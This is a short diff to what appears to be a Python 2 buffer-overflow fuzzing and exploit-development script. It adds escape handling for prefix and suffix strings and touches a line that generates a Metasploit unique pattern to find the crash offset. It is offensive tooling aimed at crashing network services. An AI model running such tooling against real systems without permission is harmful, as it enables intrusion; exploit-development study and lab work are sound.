@@ -39,7 +39,9 @@ port = arguments["port"]
 prefix = arguments["prefix"]
 suffix = arguments["suffix"]
 
-
+#The following allows the user to prefix and suffix the data with special characters
+prefix = prefix.replace("\\n", "\n").replace('\\t','\t').replace('\\r','\r').replace('\\v','\v').replace('\\b','\b').replace('\\a','\a').replace('\\f','\f').replace('\\\\','\\')
+suffix = suffix.replace('\\n', '\n').replace('\\t','\t').replace('\\r','\r').replace('\\v','\v').replace('\\b','\b').replace('\\a','\a').replace('\\f','\f').replace('\\\\','\\')
 
 bytesToOverflow = 0	#Saves how many bytes crashed the service
 
@@ -71,7 +73,7 @@ for string in buffer:
 print "\nPlease restart the vulnerable application and your debugger. Press enter to continue"
 raw_input()
 print "(-) Generating unique pattern to obtain exact offset"
-uniqueString = os.popen("msf-pattern_create -l " + str(bytesToOverflow)).read()	#Use this and pattern_offset to get exact offset
+uniqueString = os.popen("msf-pattern_create -l " + str(bytesToOverflow)).read()#Use this and pattern_offset to get exact offset
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.settimeout(TIMEOUT)
 while True:					#We'll try again if we can't connect
